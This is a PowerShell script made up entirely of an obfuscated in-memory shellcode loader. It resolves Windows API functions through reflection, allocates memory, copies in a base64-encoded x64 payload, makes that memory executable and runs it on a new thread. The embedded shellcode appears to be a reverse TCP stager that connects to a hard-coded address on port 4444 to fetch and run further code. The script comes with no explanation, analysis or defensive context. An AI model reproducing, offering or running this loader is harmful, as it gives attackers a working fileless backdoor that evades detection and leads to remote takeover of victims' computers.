function fZG {
        Param ($hQ, $vdAW)
        $v4ao = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $v4ao.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($v4ao.GetMethod('GetModuleHandle')).Invoke($null, @($hQ)))), $vdAW))
}

function yk {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $cbMB,
                [Parameter(Position = 1)] [Type] $xSbTU = [Void]
        )

        $at = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $at.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $cbMB).SetImplementationFlags('Runtime, Managed')
        $at.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $xSbTU, $cbMB).SetImplementationFlags('Runtime, Managed')

        return $at.CreateType()
}

[Byte[]]$lkn5z = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYUVZIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKgDBkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$iVl = 0
$eGQR = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fZG kernel32.dll VirtualAlloc), (yk @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $lkn5z.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($lkn5z, 0, $eGQR, $lkn5z.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fZG kernel32.dll VirtualProtect), (yk @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($eGQR, [Uint32]$lkn5z.Length, 0x10, [Ref]$iVl)) -eq $true) {
        $axH7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fZG kernel32.dll CreateThread), (yk @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$eGQR,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fZG kernel32.dll WaitForSingleObject), (yk @([IntPtr], [Int32]))).Invoke($axH7,0xffffffff) | Out-Null
}
